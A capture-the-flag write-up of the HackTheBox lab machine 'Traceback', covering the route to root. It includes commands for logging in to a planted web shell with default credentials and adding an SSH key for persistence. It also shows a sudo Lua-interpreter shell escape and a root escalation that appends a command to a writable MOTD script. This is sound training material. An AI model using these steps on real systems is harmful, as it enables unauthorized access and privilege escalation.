This box is a writeup about a retired HacktheBox machine:
[Traceback](https://www.hackthebox.eu/home/machines/profile/233) publish on
Mars the 14th 2020 by
[Xh4H](https://www.hackthebox.eu/home/users/profile/21439).
This box is rated as easy box. It implies some Google search, a lua interpreter
and a privilege escalation using the MOTD.

<!-- PELICAN_END_SUMMARY -->

# Foothold

## Recon

Let us start as always by a `nmap` scan. The box is quit busy so first of all we
run a simple aggressive TCP scan:

    :::text
    # Nmap 7.80 scan initiated Thu Mar 26 04:41:18 2020 as: nmap -p- -sS -oN nmap 10.10.10.181
    Nmap scan report for 10.10.10.181
    Host is up (0.089s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    # Nmap done at Thu Mar 26 04:42:19 2020 -- 1 IP address (1 host up) scanned in 61.23 seconds

The open ports are:

  * 22: SSH
  * 80: a web server

We do not have any information to connect to the SSH server.

The website is a simple web page saying that the website has been hacked and
that a backdoor is available for the net.

Running a `dirb` or other web fuzzing tool doesn't give any result.

Looking at the source code we found a commentary in the body: "Some of the best
web shells that you might need".

    :::html
    <body>
      <center>
        <h1>This site has been owned</h1>
        <h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
        <h3> - Xh4H - </h3>
        <!--Some of the best web shells that you might need ;)-->
      </center>
    </body>

The comment is the description of a [github repository containing
webshell](https://github.com/TheBinitGhimire/Web-Shells).

We generate a wordlist from the webshell of this repository and launch it
against the website with [ffuf](https://github.com/ffuf/ffuf).

    :::text

We go to the webshell page and found an authentication form.

![webshell homepage](/media/2020.xx/traceback_02.png)

According to Github the default credentials are "admin:admin". Once log id we
can see a few interesting information:
  * We are the user webadmin
  * Our id is '1000' which mean we are a system user

![webshell homepage](/media/2020.xx/traceback_03.png)

We change directory for `/home/webadmin/`. We see that there is a
`.ssh/authorized_keys` file (maybe you need to create it if this doesn't exist,
as I used the public server the folder and the file already existed).
We add our public ssh key to the file and connect using ssh.

    :::text
    ssh 10.10.10.181 -lwebadmin

# Getting user

In our home folder we found a note from sysadmin, the other system user about
some lua tool.

    :::text
    webadmin@traceback:~$ cat note.txt
    - sysadmin -
    I have left a tool to practice Lua.
    I'm sure you know where to find it.
    Contact me if you have any question.

Looking at our `sudo` right we have the possibility to execute `luvit` as
`sysadmin` without password.

    webadmin@traceback:~$ sudo -l
    Matching Defaults entries for webadmin on traceback:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User webadmin may run the following commands on traceback:
        (sysadmin) NOPASSWD: /home/sysadmin/luvit

We deduce that this is a lua interpreter and run some "Hello World".

    :::text
    webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit 
    Welcome to the Luvit repl!
    > print("Hello World")
    Hello World


    :::text
    webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
    $ id
    uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)

We go to our new home and read user.txt

    :::text
    $ bash
    sysadmin@traceback:~$ cd /home/sysadmin/
    sysadmin@traceback:/home/sysadmin$ ls
    luvit  user.txt
    sysadmin@traceback:/home/sysadmin$ cat user.txt 
    349f0968dce655cb15708bba0077d225

As before we add our public ssh key to the user's `.ssh/authorized_keys`.

# root

We do not know sysadmin's password required to list our `sudo` right.

We run a simple `ps aux` to know which process are running. We see (that's some
luck) that root regularly execute the following command:
`/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/`

    ::text
    root      28855  0.0  0.0   4628   856 ?        Ss   02:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/

We confirm that using [pspy](https://github.com/DominicBreuker/pspy) (using ssh
to copy the binary).

    :::text
    2020/03/26 03:07:01 CMD: UID=0    PID=29213  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
    2020/03/26 03:07:01 CMD: UID=0    PID=29212  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 

When looking at the `/var/backups/.update-motd.d` folder's permissions when see
that we can not write in any file nor create a file as everything belong to
`root`. Nevertheless, the `/etc/update-motd.d/` folder's permissions allow our
user to write in any file. We create a temporary folder and add a command to the
`00-header` file. That command will copy the file `/root/root.txt` and give us
the permissions to read it.

    :::text
    sysadmin@traceback:/etc/update-motd.d$ ls -al
    total 32
    drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
    drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
    -rwxrwxr-x  1 root sysadmin  981 Mar 26 03:59 00-header
    -rwxrwxr-x  1 root sysadmin  982 Mar 26 03:59 10-help-text
    -rwxrwxr-x  1 root sysadmin 4264 Mar 26 03:59 50-motd-news
    -rwxrwxr-x  1 root sysadmin  604 Mar 26 03:59 80-esm
    -rwxrwxr-x  1 root sysadmin  299 Mar 26 03:59 91-release-upgrade
    sysadmin@traceback:/etc/update-motd.d$ mkdir /tmp/ioio
    sysadmin@traceback:/etc/update-motd.d$ echo 'cp /root/root.txt /tmp/ioio && chmod 777 /tmp/ioio/root.txt' >> 00-header

We then quickly trigger the command by initiating a new SSH connection. We can
then grab the root flag.

    :::text
    ssh sysadmin@10.10.10.181

# Wrapping up

The box was quit easy and is really a nice one for beginner.
